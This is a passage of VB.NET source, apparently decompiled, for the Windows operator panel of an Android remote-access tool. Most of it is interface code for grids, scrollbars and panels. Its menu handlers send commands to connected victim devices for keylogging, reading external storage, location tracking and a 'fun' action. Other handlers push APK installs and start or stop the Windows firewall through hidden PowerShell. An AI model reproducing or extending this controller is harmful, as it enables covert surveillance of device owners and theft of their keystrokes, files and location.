                    Me.SELCT_Apks.Items.Add(toolStripMenuItem)
                Next
                Me.sgsdfgvdfv.DropDown = Me.SELCT_Apks
            End If
        Else
            Me.BuildingFolderToolStripMenuItem.Tag = ""
            Me.BuildingFolderToolStripMenuItem.Enabled = False
            Me.sgsdfgvdfv.Enabled = False
        End If
        Dim flag3 As Boolean = Me.DataGridView1.Rows.GetRowCount(DataGridViewElementStates.Selected) <> 1
        If flag3 Then
            Me.ClientFolderDownloadsToolStripMenuItem.Enabled = False
            Me.OtherClientFolderToolStripMenuItem.Enabled = False
        Else
            Me.ClientFolderDownloadsToolStripMenuItem.Enabled = True
            Me.OtherClientFolderToolStripMenuItem.Enabled = True
        End If
    End Sub

    Private Sub DataBlackListView_GotFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataBlackListView.GotFocus
        Me.bol2 = True
    End Sub

    Private Sub DataBlackListView_LostFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataBlackListView.LostFocus
        Me.bol2 = False
    End Sub

    Private Sub DataBlackListView_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataBlackListView.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar4 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar4
            visualStudioVerticalScrollBar4.Value = visualStudioVerticalScrollBar4.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar4
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataBlackListView_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles DataBlackListView.RowsAdded
        If (MyBase.Visible) Then
            If (Operators.ConditionalCompareObjectEqual(Me.Bdown1.Tag, "down", False)) Then
                Me.int1 = 10
            End If
        End If
    End Sub

    Private Sub DataBlackListView_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataBlackListView.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq4 = e.Row.Index + 1
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq4 = 0
        Else
            Me.aq4 = 1
        End If
    End Sub

    Private Sub DataBlackListView_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataBlackListView.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.DataBlackListView_Y = e.NewValue
            Me.VisualStudioVerticalScrollBar4.Value = Me.DataBlackListView_Y
        Else
            Me.DataBlackListView_X = e.NewValue
            Me.VisualStudioHorizontalScrollBar3.Value = Me.DataBlackListView_X
        End If
    End Sub

    Private Sub DataGridView1_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub DataGridView1_CellMouseLeave(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles DataGridView1.CellMouseLeave
        Me.RowsToolTip._ToolTip.Hide(Me.DataGridView1)
        Me.RowsToolTipShow = False
    End Sub

    Private Sub DataGridView1_CellMouseMove(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles DataGridView1.CellMouseMove
        If (e.RowIndex <> -1 And e.ColumnIndex <> -1) Then
            If (Me.DataGridView1.ShowCellToolTips) Then
                Me.DataGridView1.ShowCellToolTips = False
            End If
            Dim str As String = Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText.Trim()
            If (Not Me.RowsToolTipShow) Then
                If (str.Length <> 0) Then
                    Dim client As Point = MyBase.PointToClient(Control.MousePosition)
                    Me.RowsToolTip._ToolTip.Show(Me.DataGridView1.Rows(e.RowIndex).Cells(e.ColumnIndex).ToolTipText, Me.DataGridView1, client)
                    Me.RowsToolTipShow = True
                End If
            End If
        End If
    End Sub

    Private Sub DataGridView1_GotFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataGridView1.GotFocus
        Me.bol0 = True
    End Sub

    Private Sub DataGridView1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles DataGridView1.KeyDown
        Dim keyCode As Keys = e.KeyCode
        If (keyCode <= Keys.D) Then
            If (keyCode <> Keys.[Return]) Then
                If (keyCode <> Keys.A) Then
                    If (keyCode <> Keys.D) Then
                        GoTo Label0
                    End If
                End If
            End If
        ElseIf (keyCode <> Keys.F) Then
            If (keyCode <> Keys.K) Then
                If (keyCode <> Keys.P) Then
                    GoTo Label0
                End If
            End If
        End If
Label3:
        Select Case Me.keeys0
            Case 0
                If (e.KeyCode = Keys.A) Then
                    Me.keeys0 = 1
                End If
                Exit Select
            Case 1
                If (e.KeyCode = Keys.P) Then
                    Me.keeys0 = 2
                End If
                Exit Select
            Case 2
                If (e.KeyCode = Keys.K) Then
                    Me.keeys0 = 3
                End If
                Exit Select
            Case 3
                If (e.KeyCode = Keys.[Return]) Then
                    Me.ApkS()
                    Me.keeys0 = 0
                End If
                Exit Select
            Case Else
                If (Me.keeys0 <> 0) Then
                    Me.keeys0 = 0
                End If
                Exit Select
        End Select
        Dim num As Integer = Me.keeys1
        If (num = 0) Then
            If (e.KeyCode = Keys.D) Then
                Me.keeys1 = 1
            End If
        ElseIf (num <> 1) Then
            If (Me.keeys1 <> 0) Then
                Me.keeys1 = 0
            End If
        ElseIf (e.KeyCode = Keys.[Return]) Then
            Me._Downloads()
            Me.keeys1 = 0
        End If
        Dim num1 As Integer = Me.keeys2
        If (num1 = 0) Then
            If (e.KeyCode = Keys.F) Then
                Me.keeys2 = 1
            End If
        ElseIf (num1 <> 1) Then
            If (Me.keeys2 <> 0) Then
                Me.keeys2 = 0
            End If
        ElseIf (e.KeyCode = Keys.[Return]) Then
            Me._ClientFolder()
            Me.keeys2 = 0
        End If
        Return
Label0:
        Me.keeys0 = 0
        Me.keeys1 = 0
        Me.keeys2 = 0
        GoTo Label3
    End Sub

    Private Sub DataGridView1_LostFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataGridView1.LostFocus
        Me.bol0 = False
    End Sub

    Private Sub DataGridView1_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataGridView1.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataGridView1_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataGridView1.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq1 = e.Row.Index + 1
                Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq1 = 0
        Else
            Me.aq1 = 1
        End If
    End Sub

    Private Sub DataGridView1_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataGridView1.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub DataGridView1_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles DataGridView1.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub DataLogsView_GotFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataLogsView.GotFocus
        Me.bol1 = True
    End Sub

    Private Sub DataLogsView_LostFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataLogsView.LostFocus
        Me.bol1 = False
    End Sub

    Private Sub DataLogsView_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataLogsView.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar3 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar3
            visualStudioVerticalScrollBar3.Value = visualStudioVerticalScrollBar3.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar3
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataLogsView_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles DataLogsView.RowsAdded
        If (MyBase.Visible) Then
            If (Operators.ConditionalCompareObjectEqual(Me.Bdown0.Tag, "down", False)) Then
                Me.int0 = 10
            End If
        End If
    End Sub

    Private Sub DataLogsView_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataLogsView.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq2 = e.Row.Index + 1
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq2 = 0
        Else
            Me.aq2 = 1
        End If
    End Sub

    Private Sub DataLogsViewDataGridView1_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataLogsView.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.DataLogsView_Y = e.NewValue
            Me.VisualStudioVerticalScrollBar3.Value = Me.DataLogsView_Y
        Else
            Me.DataLogsView_X = e.NewValue
            Me.VisualStudioHorizontalScrollBar2.Value = Me.DataLogsView_X
        End If
    End Sub

    Private Sub DataMonitorAndroidView_GotFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataMonitorAndroidView.GotFocus
        Me.bol3 = True
    End Sub

    Private Sub DataMonitorAndroidView_LostFocus(ByVal sender As Object, ByVal e As EventArgs) Handles DataMonitorAndroidView.LostFocus
        Me.bol3 = False
    End Sub

    Private Sub DataMonitorAndroidView_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles DataMonitorAndroidView.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar5 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar5
            visualStudioVerticalScrollBar5.Value = visualStudioVerticalScrollBar5.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar5
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub DataMonitorAndroidView_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles DataMonitorAndroidView.RowsAdded
        If (MyBase.Visible) Then
            If (Operators.ConditionalCompareObjectEqual(Me.Bdown2.Tag, "down", False)) Then
                Me.int2 = 10
            End If
        End If
    End Sub

    Private Sub DataMonitorAndroidView_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles DataMonitorAndroidView.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq5 = e.Row.Index + 1
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq5 = 0
        Else
            Me.aq5 = 1
        End If
    End Sub

    Private Sub DataMonitorAndroidView_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles DataMonitorAndroidView.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.DataMonitorAndroidView_Y = e.NewValue
            Me.VisualStudioVerticalScrollBar5.Value = Me.DataMonitorAndroidView_Y
        Else
            Me.DataMonitorAndroidView_X = e.NewValue
            Me.VisualStudioHorizontalScrollBar4.Value = Me.DataMonitorAndroidView_X
        End If
    End Sub
    Private Sub DownPNL_Tick(sender As Object, e As EventArgs) Handles DownPNL.Tick
        Dim flag As Boolean = Me.PNL1.Size.Height < Conversions.ToInteger(Me.PNL1.Tag)
        If flag Then
            Me.xPNL1 += 5
            Me.PNL1.Size = New Size(Me.PNL1.Size.Width, Me.xPNL1)
        Else
            Me.bPNL1 = True
        End If
        Dim flag2 As Boolean = Me.PNL2.Size.Height < Conversions.ToInteger(Me.PNL2.Tag)
        If flag2 Then
            Me.xPNL2 += 5
            Me.PNL2.Size = New Size(Me.PNL2.Size.Width, Me.xPNL2)
        Else
            Me.bPNL2 = True
        End If
        Dim flag3 As Boolean = Me.PNL3.Size.Height < Conversions.ToInteger(Me.PNL3.Tag)
        If flag3 Then
            Me.xPNL3 += 5
            Me.PNL3.Size = New Size(Me.PNL3.Size.Width, Me.xPNL3)
        Else
            Me.bPNL3 = True
        End If
        Dim flag4 As Boolean = Me.bPNL1 And Me.bPNL2 And Me.bPNL3
        If flag4 Then
            Me.DownPNL.Enabled = False
        End If
    End Sub
    Private Sub FfToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FfToolStripMenuItem.Click
        Dim str As String = "C:\Windows\System32\mmc.exe"
        Dim processStartInfo As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo() With
        {
            .FileName = str,
            .Arguments = "C:\Windows\system32\wf.msc",
            .WindowStyle = ProcessWindowStyle.Hidden
        }
        Process.Start(processStartInfo)
    End Sub

    Private Sub FileManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        Try
            For Each obj As Object In Me.DataGridView1.SelectedRows
                Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
                Dim socketClient As SocketClient = CType(dataGridViewRow.Tag, SocketClient)
                Dim flag As Boolean = socketClient IsNot Nothing
                If flag Then
                    socketClient.Send(Store.BFF(Store.buff, 14L) + Data.SplitData + "GetExternalStorage")
                End If
            Next
        Finally
        End Try
    End Sub

    Private Sub FirStartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FirStartToolStripMenuItem.Click
        If (File.Exists("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")) Then
            Interaction.Shell("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Start-Service MpsSvc", AppWinStyle.Hide, False, -1)
        End If
    End Sub

    Private Sub FirStopToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FirStopToolStripMenuItem.Click
        If (File.Exists("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")) Then
            Interaction.Shell("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Stop-Service MpsSvc", AppWinStyle.Hide, False, -1)
        End If
    End Sub

    Private Sub FunToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FunToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(Store.BFF(Store.buff, CLng(62)), Data.SplitData))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub GetAPKs(ByVal sender As Object, ByVal e As EventArgs)
        Try
            Dim tag As String = CStr(TryCast(sender, ToolStripMenuItem).Tag)
            If (Operators.CompareString(tag, Nothing, False) <> 0) Then
                Dim str As String = String.Concat(Store.Resources(1), "\Imports\platform-tools\plwin.exe")
                If (File.Exists(str)) Then
                    Dim sPL As String = Me.SPL
                    Dim handle As IntPtr = MyBase.Handle
                    Dim str1 As String = String.Concat("OK", sPL, handle.ToString())
                    Dim processStartInfo As System.Diagnostics.ProcessStartInfo = New System.Diagnostics.ProcessStartInfo() With
                    {
                        .FileName = str,
                        .Arguments = str1,
                        .WindowStyle = ProcessWindowStyle.Hidden
                    }
                    Try
                        Dim str2 As String = "devices"
                        Dim item As devices = DirectCast(My.Application.OpenForms(str2), devices)
                        If (item IsNot Nothing) Then
                            Return
                        Else
                            If (Me.PublicPID <> -1) Then
                                If (Store.FindPID(Me.PublicPID)) Then
                                    Me.PublicPID = -1
                                End If
                            End If
                            item = New devices() With
                            {
                                .Name = str2,
                                .Text = str2,
                                .comd = "install",
                                .comdPAth = tag.ToString()
                            }
                            item.Show()
                            Me.PublicPID = Process.Start(processStartInfo).Id
                        End If
                    Catch exception As System.Exception
                    End Try
                End If
            End If
        Catch exception1 As System.Exception
        End Try
    End Sub

    Public Function getDriv() As Object
        Dim obj As Object
        Try
            Dim executablePath As String = Application.ExecutablePath
            Dim strArrays As String() = executablePath.Split(New String() {"\"}, StringSplitOptions.RemoveEmptyEntries)
            obj = String.Concat(strArrays(0).ToString(), "\")
        Catch exception As System.Exception
            obj = "C:\"
        End Try
        Return obj
    End Function

    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.DataGridView1.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataGridView1.Width
        ' The following expression was wrapped in a checked-statement
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.DataGridView1.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataGridView1.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataGridView1.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataGridView1.Rows.Count * Me.DataGridView1.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataGridView1.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Private Sub GridViewoVerticalScrollBar1()
        Dim columnsWidth As Integer = Me.DataLogsView.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataLogsView.Width
        ' The following expression was wrapped in a checked-statement
        If flag Then
            Me.VisualStudioHorizontalScrollBar2.Maximum = columnsWidth - Me.DataLogsView.Width
        Else
            Me.VisualStudioHorizontalScrollBar2.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataLogsView.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar2.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar2.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar2.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar2.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataLogsView.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataLogsView.Rows.Count * Me.DataLogsView.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataLogsView.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar3.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar3.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar3.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar3.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar3.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar3.Visible = False
            End If
        End If
    End Sub

    Private Sub GridViewoVerticalScrollBar2()
        Dim columnsWidth As Integer = Me.DataBlackListView.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataBlackListView.Width
        ' The following expression was wrapped in a checked-statement
        If flag Then
            Me.VisualStudioHorizontalScrollBar3.Maximum = columnsWidth - Me.DataBlackListView.Width
        Else
            Me.VisualStudioHorizontalScrollBar3.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataBlackListView.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar3.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar3.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar3.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar3.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataBlackListView.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataBlackListView.Rows.Count * Me.DataBlackListView.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataBlackListView.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar4.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar4.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar4.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar4.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar4.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar4.Visible = False
            End If
        End If
    End Sub

    Private Sub GridViewoVerticalScrollBar3()
        Dim columnsWidth As Integer = Me.DataMonitorAndroidView.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.DataMonitorAndroidView.Width
        ' The following expression was wrapped in a checked-statement
        If flag Then
            Me.VisualStudioHorizontalScrollBar4.Maximum = columnsWidth - Me.DataMonitorAndroidView.Width
        Else
            Me.VisualStudioHorizontalScrollBar4.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.DataMonitorAndroidView.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar4.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar4.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar4.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar4.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.DataMonitorAndroidView.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.DataMonitorAndroidView.Rows.Count * Me.DataMonitorAndroidView.Rows(0).Height
            Dim flag6 As Boolean = num > Me.DataMonitorAndroidView.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar5.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar5.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar5.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar5.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar5.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar5.Visible = False
            End If
        End If
    End Sub
    Private Sub GView_CellEnter(ByVal sender As Object, ByVal e As DataGridViewCellEventArgs) Handles GView.CellEnter
        Me.NView.ClearSelection()
        Me.PView.ClearSelection()
    End Sub

    Private Sub InformationsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles InformationsToolStripMenuItem.Click
        If (Me.SplitContainer1.Panel2Collapsed) Then
            Me.SplitContainer1.Panel2Collapsed = False
            Me.InformationsToolStripMenuItem.Checked = True
            Me.InformationsToolStripMenuItem.Tag = "Checked"
            Me.DataGridView1.Focus()
        End If
        Me.Refresh()
    End Sub
    Private Sub KeyloggerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(String.Concat(Store.BFF(Store.buff, CLng(50)), Data.SplitData))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub L1_LinkClicked(ByVal sender As Object, ByVal e As LinkLabelLinkClickedEventArgs) Handles L1.LinkClicked
        If (Not Operators.ConditionalCompareObjectEqual(Me.L1.Tag, "-", False)) Then
            Me.PNL1.Visible = True
            Me.L1.Tag = "-"
        Else
            Me.PNL1.Visible = False
            Me.L1.Tag = "+"
        End If
        Me.L1.Text = String.Concat(Strings.Space(3), "Server Info")
    End Sub

    Private Sub L1_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L1.MouseDown
        Me.L1MouseDown = True
    End Sub

    Private Sub L1_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L1.MouseUp
        Me.L1MouseDown = False
    End Sub

    Private Sub L1_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles L1.Paint
        Dim pen As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L1MouseDown, Me.L1.LinkColor, Me.L1.ActiveLinkColor), 1.0!)
        Dim pen1 As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L1MouseDown, Me.L1.LinkColor, Me.L1.ActiveLinkColor), 1.0!)
        If (Not Operators.ConditionalCompareObjectEqual(Me.L1.Tag, "-", False)) Then
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
            e.Graphics.DrawLine(pen, 5, 5, 5, 9)
        Else
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
        End If
        e.Graphics.DrawRectangle(pen1, 1, 3, 8, 8)
    End Sub

    Private Sub L2_LinkClicked(ByVal sender As Object, ByVal e As LinkLabelLinkClickedEventArgs) Handles L2.LinkClicked
        If (Not Operators.ConditionalCompareObjectEqual(Me.L2.Tag, "-", False)) Then
            Me.PNL2.Visible = True
            Me.L2.Tag = "-"
        Else
            Me.PNL2.Visible = False
            Me.L2.Tag = "+"
        End If
        Me.L2.Text = String.Concat(Strings.Space(3), "Network Info")
    End Sub

    Private Sub L2_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L2.MouseDown
        Me.L2MouseDown = True
    End Sub

    Private Sub L2_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L2.MouseUp
        Me.L2MouseDown = False
    End Sub

    Private Sub L2_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles L2.Paint
        Dim pen As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L2MouseDown, Me.L2.LinkColor, Me.L2.ActiveLinkColor), 1.0!)
        Dim pen1 As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L2MouseDown, Me.L2.LinkColor, Me.L2.ActiveLinkColor), 1.0!)
        If (Not Operators.ConditionalCompareObjectEqual(Me.L2.Tag, "-", False)) Then
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
            e.Graphics.DrawLine(pen, 5, 5, 5, 9)
        Else
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
        End If
        e.Graphics.DrawRectangle(pen1, 1, 3, 8, 8)
    End Sub

    Private Sub L3_LinkClicked(ByVal sender As Object, ByVal e As LinkLabelLinkClickedEventArgs) Handles L3.LinkClicked
        If (Not Operators.ConditionalCompareObjectEqual(Me.L3.Tag, "-", False)) Then
            Me.PNL3.Visible = True
            Me.L3.Tag = "-"
        Else
            Me.PNL3.Visible = False
            Me.L3.Tag = "+"
        End If
        Me.L3.Text = String.Concat(Strings.Space(3), "Process")
    End Sub

    Private Sub L3_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L3.MouseDown
        Me.L3MouseDown = True
    End Sub

    Private Sub L3_MouseUp(ByVal sender As Object, ByVal e As MouseEventArgs) Handles L3.MouseUp
        Me.L3MouseDown = False
    End Sub

    Private Sub L3_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles L3.Paint
        Dim pen As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L3MouseDown, Me.L3.LinkColor, Me.L3.ActiveLinkColor), 1.0!)
        Dim pen1 As System.Drawing.Pen = New System.Drawing.Pen(If(Not Me.L3MouseDown, Me.L3.LinkColor, Me.L3.ActiveLinkColor), 1.0!)
        If (Not Operators.ConditionalCompareObjectEqual(Me.L3.Tag, "-", False)) Then
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
            e.Graphics.DrawLine(pen, 5, 5, 5, 9)
        Else
            e.Graphics.DrawLine(pen, 3, 7, 7, 7)
        End If
        e.Graphics.DrawRectangle(pen1, 1, 3, 8, 8)
    End Sub

    Private Sub LocationManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LocationManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
